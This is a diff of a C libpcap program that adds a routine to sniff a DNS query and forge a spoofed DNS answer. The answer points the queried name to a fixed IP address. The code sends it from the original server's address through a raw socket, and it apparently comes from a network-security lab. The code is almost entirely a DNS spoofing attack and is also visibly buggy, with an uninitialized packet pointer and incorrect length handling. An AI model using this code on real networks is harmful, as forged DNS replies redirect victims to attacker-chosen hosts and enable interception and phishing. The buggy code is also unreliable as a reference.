@@ -32,7 +32,8 @@ int main(int argc, char *argv[])
 {
 	pcap_t *handle;
 	pcap_if_t *all_dev, *dev;
-
+	u_char ** packet;
+	struct pcap_pkthdr* header;
 	char err_buf[PCAP_ERRBUF_SIZE], dev_list[30][2];
 	char *dev_name;
 	bpf_u_int32 net_ip, mask;
@@ -150,10 +151,12 @@ int main(int argc, char *argv[])
 	}
 
 	//Put the device in sniff loop
-	pcap_loop(handle , -1 , process_packet , NULL);
-
+	//pcap_loop(handle , -1 , process_packet , NULL);
+	pcap_next_ex(handle,&header,packet);
 	pcap_close(handle);
-
+	printf("%d %d\n", header->len,sizeof(*packet));
+	print_udp_packet((u_char*)(*packet+sizeof(struct ethhdr)), 1000);
+	process_single_packet(header, *packet);
 	return 0;
 
 }
@@ -285,3 +288,130 @@ void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char
 
 }
 
+
+void process_single_packet(const struct pcap_pkthdr *header, const u_char *buffer)
+{
+	printf("a packet is received! %d \n", total++);
+	int size = header->len;
+
+
+//	PrintData(buffer, size);
+
+	//Finding the beginning of IP header
+	struct iphdr *in_iphr;
+
+	switch (header_type)
+	{
+	case LINKTYPE_ETH:
+		in_iphr = (struct iphdr*)(buffer + sizeof(struct ethhdr)); //For ethernet
+		size -= sizeof(struct ethhdr);
+		break;
+
+	case LINKTYPE_NULL:
+		in_iphr = (struct iphdr*)(buffer + 4);
+		size -= 4;
+		break;
+
+	case LINKTYPE_WIFI:
+		in_iphr = (struct iphdr*)(buffer + 57);
+		size -= 57;
+		break;
+
+	default:
+		fprintf(stderr, "Unknown header type %d\n", header_type);
+		exit(1);
+	}
+
+	print_udp_packet((u_char*)in_iphr, size);
+
+	//to keep the DNS information received.
+	res_record answers[ANS_SIZE], auth[ANS_SIZE], addit[ANS_SIZE];
+	query queries[ANS_SIZE];
+	bzero(queries, ANS_SIZE*sizeof(query));
+	bzero(answers, ANS_SIZE*sizeof(res_record));
+	bzero(auth, ANS_SIZE*sizeof(res_record));
+	bzero(addit, ANS_SIZE*sizeof(res_record));
+
+	//the UDP header
+	struct udphdr *in_udphdr = (struct udphdr*)(in_iphr +1);//(((unsigned int)(in_iphr->ihl))*4));
+	print_udp_header((u_char*)in_udphdr, size);
+	//the DNS header
+	//	dns_header *dnsh = (dns_header*)(udph + 1);
+	uint8_t *dns_buff = (uint8_t*)(in_udphdr + 1);//sizeof(udphdr));
+
+	//	parse the dns query
+	int id = parse_dns_query(dns_buff, queries, answers, auth, addit);
+	if((ntohs(((dns_header* )dns_buff)->qd_count)!=1)) return;//||(((dns_header* )dns_buff)->ar_count)!=0) return;
+	printf("passed dns check\n");
+	/******************now build the reply using raw IP ************/
+	uint8_t send_buf[BUF_SIZE]; //sending buffer
+	bzero(send_buf, BUF_SIZE);
+
+	/**********dns header*************/
+
+	dns_header *dnshdr = (dns_header*)(send_buf + sizeof(struct iphdr) + sizeof(struct udphdr));
+	int dns_size=sizeof(dns_header)+name_size(queries[0].qname)+14;
+    build_dns_header(dnshdr,id,1,0,1,0,0);
+	u_int8_t* p =dnshdr+1;
+
+	r_element answer;
+	answer.type=htons(TYPE_A);
+    answer.rdlength=htons(4);
+    answer.ttl=htonl(1000);
+    answer._class=htons(CLASS_IN);
+	printf("here2\n");
+	memcpy(p,&(queries[0].qname),2);
+	p=p+2;
+	printf("here3\n");
+	memcpy(p,&(answer),5);
+	p=p+5;
+	inet_pton(AF_INET,"129.104.96.100",p);
+
+	printf("past dns\n");
+
+	/****************UDP header********************/
+	struct udphdr *out_udphdr = (struct udphdr*)(send_buf + sizeof(struct iphdr));
+    
+    out_udphdr->source=in_udphdr->dest;
+	out_udphdr->dest=in_udphdr->source;
+	out_udphdr->len=htons(8+dns_size);
+	out_udphdr->check=0;
+
+	/*****************IP header************************/
+	struct iphdr *iph = (struct iphdr*)send_buf;
+
+    iph->version=4;
+	iph->tos=0;
+	iph->ihl=5;
+	iph->tot_len=htons(sizeof (struct iphdr) + sizeof (struct udphdr) + dns_size);
+	iph->id=htons(1);    
+	iph->frag_off= htons(0);
+	iph->ttl=100;
+	iph->protocol=IPPROTO_UDP;
+	iph->saddr=in_iphr->daddr;
+    iph->daddr=in_iphr->saddr;
+	iph->check=htons(checksum((char*) iph,iph->tot_len));
+	
+	/************** send out using raw IP socket************/
+	printf("to the end\n");
+
+    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+
+    int hincl = 1;                  /* 1 = on, 0 = off */
+    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));
+
+	if(fd < 0)
+	{
+		perror("Error creating raw socket ");
+		exit(1);
+	}
+	struct sockaddr_in to;
+	to.sin_addr.s_addr=in_iphr->saddr;
+	to.sin_family=AF_INET;
+	to.sin_port=in_udphdr->source;
+	print_udp_packet(send_buf,size);
+	sendto(fd,send_buf,2000,0,&to,sizeof(to));
+	perror("");
+
+
+}
